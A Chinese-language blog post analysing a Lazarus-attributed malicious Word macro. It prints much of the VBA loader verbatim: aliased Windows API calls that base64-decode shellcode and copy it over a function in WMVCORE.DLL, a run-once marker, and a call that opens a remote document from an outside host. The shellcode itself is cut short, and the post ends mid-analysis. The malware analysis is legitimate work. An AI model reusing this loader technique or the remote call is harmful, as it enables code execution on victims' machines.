一个很有意思的shellcode执行方式
前言
好久没更文了,最近事情比较多.在日常看样本的时候看到了一个Lazarus所使用的新型Macro植入物.其还
是该组织第一次使用的相关技术感觉比较少见而且很有意思。虽然技术不是一个很先进的技术但是在宏
的利用中却有一定的可能.还是可以多多学习用于RedTeam的工作中的
Macro宏分析
前面的导出声明部分:
Private Declare PtrSafe Function WMCreateBackupRestorer Lib "Crypt32" _
    Alias "CryptStringToBinaryW" (ByVal WmBckupParam1 As LongPtr, ByVal 
WmBckupParam2 As Long, ByVal WmBckupParam3 As LongPtr, ByVal WmBckupParam4 As 
LongPtr, ByVal WmBckupParam5 As LongPtr, ByVal WmBckupParam6 As LongPtr, ByVal 
WmBckupParam7 As LongPtr) As Long
Private Const Play_Encd = &H4
Private Const Play_Decd_Rdh = &H20
Private Const Play_Encd_Dcd = &H40
Private Const WM_CERTSYNCREAD = &H1
#If Win64 Then
Private Declare PtrSafe Function LoadPlaybackHD Lib "kernel32" _
    Alias "LoadLibraryA" (ByVal LoadPlaybackHDSize As String) As LongLong
#Else
Private Declare PtrSafe Function LoadPlaybackHD Lib "kernel32" _
    Alias "LoadLibraryA" (ByVal LoadPlaybackHDSize As String) As Long
#End If
#If Win64 Then
Private Declare PtrSafe Function WMvdspt Lib "kernel32" _
    Alias "GetProcAddress" (ByVal WMvdsptParam1 As LongLong, ByVal WMvdsptParam2 
As String) As LongPtr
#Else
Private Declare PtrSafe Function WMvdspt Lib "kernel32" _
    Alias "GetProcAddress" (ByVal WMvdsptParam1 As Long, ByVal WMvdsptParam2 As 
String) As LongPtr
#End If
#If Win64 Then
Private Declare PtrSafe Function WMVSDecd Lib "kernel32" _
    Alias "VirtualProtect" (WMVSDecdParam1 As LongPtr, ByVal WMVSDecdParam2 As 
LongLong, ByVal WMVSDecdParam3 As Long, WMVSDecdParam4 As LongPtr) As Long
Private Declare PtrSafe Sub WMVdspa Lib "ntdll" Alias "memcpy" (ByRef 
WMVdspaParam1 As Any, ByRef WMVdspaParam2 As Any, ByVal WMVdspaParam3 As 
LongLong)
整理一下别名
执行的入口部分 通过 Frame1_Layout 执行宏的操作
#Else
Private Declare PtrSafe Function WMVSDecd Lib "kernel32" _
    Alias "VirtualProtect" (WMVSDecdParam1 As LongPtr, ByVal WMVSDecdParam2 As 
Long, ByVal WMVSDecdParam3 As Long, WMVSDecdParam4 As LongPtr) As Long
Private Declare PtrSafe Sub WMVdspa Lib "ntdll" Alias "memcpy" (ByRef 
WMVdspaParam1 As Any, ByRef WMVdspaParam2 As Any, ByVal WMVdspaParam3 As Long)
#End If
#If Win64 Then
Dim WMPlaybackHD As LongLong
Dim WMPlaybackSC As LongLong
Dim WMPlaybackRadd As LongLong
#Else
Dim WMPlaybackHD As Long
Dim WMPlaybackSC As Long
Dim WMPlaybackRadd As Long
#End If
Private Type WMSCRINFO
    WmScrData1      As LongPtr
    WmScrData2  As LongPtr
    WmScrData3    As LongPtr
    WmScrMeta1    As LongPtr
    WmScrMeta2 As LongPtr
    WmScrMeta3    As LongPtr
End Type
Private Declare PtrSafe Function WmScrEncd Lib "ntdll" Alias 
"NtQueryInformationProcess" ( _
   ByVal StreamEncdIn1 As LongPtr, _
   ByVal StreamEncdIn2 As Long, _
   ByRef StreamEncdIn3 As WMSCRINFO, _
   ByVal StreamEncdIn4 As Long, _
   ByRef StreamEncdIn5 As Long _
) As Integer
WMCreateBackupRestorer --> CryptStringToBinaryW
LoadPlaybackHD --> LoadLibraryA
WMvdspt --> GetProcAddress
WMVSDecd --> VirtualProtect
WMVdspa --> memcpy
WmScrEncd --> NtQueryInformationProcess
Private Sub Frame1_Layout()
On Error Resume Next
WMPlaybackHD = LoadPlaybackHD("WMVCORE.DLL")
Dim wmorder2 As Long
Dim wmorder As Long
Dim WMVSDecpro As Long
#If Win64 Then
WMPlaybackRadd = 8
wmorder2 = &H58
wmorder = &H10
WMVSDecpro = Play_Encd
#Else
WMPlaybackRadd = 4
wmorder2 = &H2C
wmorder = &H8
WMVSDecpro = Play_Encd_Dcd
#End If
Dim WmEmptyData As LongPtr
Dim Ret As Long
Dim WMCreateFileSink As LongPtr
Dim WMModifyFSink As LongPtr
Dim capa As Long
Dim wsi As WMSCRINFO
Dim wmsct As LongPtr
Dim wmflash As LongPtr
Dim wmWnd As LongPtr
WMPlaybackSC = 0
If WMIsAvailableOffline() = False Then
    WMCreateFileSink = WMvdspt(WMPlaybackHD, "WMIsAvailableOffline")
    Result = WmScrEncd(-1, 0, wsi, Len(wsi), capa)
    WMVdspa wmsct, ByVal (wsi.WmScrData2 + wmorder2), WMPlaybackRadd
    Ret = WMVSDecd(ByVal (WMCreateFileSink - 16), &H100000, Play_Encd, 
WmEmptyData)
    wmflash = wmsct + wmorder
    Ret = WMVSDecd(ByVal (wmflash), WMPlaybackRadd, WMVSDecpro, WmEmptyData)
    WMModifyFSink = WMCreateFileSink
    WMModifyFSink = WMCheckURLScheme1(WMModifyFSink)
    WMModifyFSink = WMCheckURLScheme2(WMModifyFSink)
    WMModifyFSink = WMCheckURLScheme3(WMModifyFSink)
    WMVdspa ByVal (WMCreateFileSink - 16), ByVal (wmflash), WMPlaybackRadd
    Ret = WMVSDecd(ByVal (WMCreateFileSink - 16), &H100000, Play_Decd_Rdh, 
WmEmptyData)
    WMVdspa ByVal (wmflash), (WMCreateFileSink), WMPlaybackRadd
    If ThisDocument.ReadOnly = False Then
        WMCreateIndexer
        ThisDocument.Save
    End If
End If
Application.Documents.Open ("https://lm-career.com/careeroppr.docx")
If ActiveDocument <> ThisDocument Then
    ThisDocument.Close
End If
在分析这些代码之前先把其他的一些函数进行分析
End Sub
'防止多开 只运行一次
Private Function WMIsAvailableOffline() As Boolean
On Error Resume Next
If ThisDocument.Variables("WMCreateFileSink").Value <> "WMBackupSignal" Then
    WMIsAvailableOffline = False
Else
    WMIsAvailableOffline = True
End If
End Function
'执行shellcode后将WMCreateFileSink的的值设为WMBackupSignal
Private Function WMCreateIndexer()
On Error Resume Next
ThisDocument.Variables.Add Name:="WMCreateFileSink"
ThisDocument.Variables("WMCreateFileSink").Value = "WMBackupSignal"
End Function
'CryptStringToBinaryW进行base64解码shellcode
Private Function WMCheckURLScheme1(WMCreateFileSink As LongPtr) As LongPtr
#If Win64 Then
Dim MediaSection(2800) As String
MediaSection(1) = 
"6w5fSIsfSIPvFUgD+//nw+jt////1AAAAAAAAADrAljD6Pn///9JbEhEWFBKK2xnYk5xUzFHUWUqMDV
BZjV4R3VTTzVLSDZI"
MediaSection(2) = 
"ZG5zckdEVUEqTlRCYVdxeHR3Y3BnWGVLZFVERno0cTJwV0NNS1Izcit4U3g3djBKcW1PSlcxWVNtZFR
jZW5TQlJWa3dxQU9x"
'.......省略(太长了)
#Else
#End If
Dim NullPtr As LongPtr
Dim NullLong As Long
Dim MediaSectionLen As Long
For idx = 1 To UBound(MediaSection)
If CryptStringToBinaryW(StrPtr(MediaSection(idx)), Len(MediaSection(idx)), 
WM_CERTSYNCREAD, 0, VarPtr(MediaSectionLen), 0, 0) Then
If MediaSectionLen Then
If CryptStringToBinaryW(StrPtr(MediaSection(idx)), Len(MediaSection(idx)), 
WM_CERTSYNCREAD, WMCreateFileSink, VarPtr(MediaSectionLen), 0, 0) Then
'Private Const WM_CERTSYNCREAD = &H1(0x00000001)
WMCreateFileSink = WMCreateFileSink + MediaSectionLen
End If
End If
End If
Next idx
WMCheckURLScheme1 = WMCreateFileSink
End Function
现在我们将一些其他的函数进行整理后 我们所得到了一些比较关键的函数 我们将其重命名后方便后面的
理解
整理一下入口代码:
Dim NullPtr As LongPtr